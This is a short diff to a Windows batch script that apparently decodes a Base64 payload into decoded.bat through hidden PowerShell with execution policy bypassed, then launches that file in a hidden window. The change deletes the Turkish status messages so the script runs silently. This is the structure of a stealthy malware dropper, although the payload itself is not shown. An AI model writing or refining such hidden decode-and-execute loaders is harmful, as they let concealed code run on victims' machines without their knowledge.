@@ -9,11 +9,11 @@ powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "[Sys
 
 
 if exist decoded.bat (
-    echo [INFO] Çözülen dosya oluşturuldu: decoded.bat
+    
     timeout /t 2 >nul
     start /b powershell -WindowStyle Hidden -Command "Start-Process 'decoded.bat' -WindowStyle Hidden"
 ) else (
-    echo [ERROR] Base64 çözme işlemi başarısız!
+    
 )
 
 
